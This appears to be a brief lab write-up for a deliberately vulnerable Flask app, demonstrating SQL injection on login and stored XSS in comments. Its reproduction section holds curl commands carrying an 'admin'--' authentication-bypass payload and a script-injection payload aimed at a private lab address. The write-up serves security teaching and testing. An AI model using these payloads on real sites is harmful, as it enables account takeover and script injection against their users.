**Project:** webapp-fire — mini vulnerable Flask app  
**Role:** Author / tester  
**Date:** (replace with date)

## Summary
Deliberately vulnerable Flask app used to demonstrate two issues:
- **SQL Injection (login)** — authentication bypass via unparameterized SQL.
- **Stored XSS (comments)** — persistent script execution from user comments.

## Evidence (included)
- `sqli_response.txt`, `sqli_repeater_response.xml`, `screenshot_sqli_burp.png`  
- `xss_response.txt`, `xss_response_post.txt`, `screenshot_xss_alert.png`

## Reproduction (concise)
```bash
# SQLi
curl -s -X POST -d "username=admin'--&password=x" http://10.0.2.15:5000/login -c cookies.txt -o sqli_response_post.txt
curl -s -L -b cookies.txt http://10.0.2.15:5000/ -o sqli_response.txt

# XSS
curl -s -X POST -d "name=attacker&comment=<script>alert('xss')</script>" http://10.0.2.15:5000/comment -b cookies.txt -c cookies.txt -o xss_response_post.txt
curl -s -L -b cookies.txt http://10.0.2.15:5000/ -o xss_response.txt
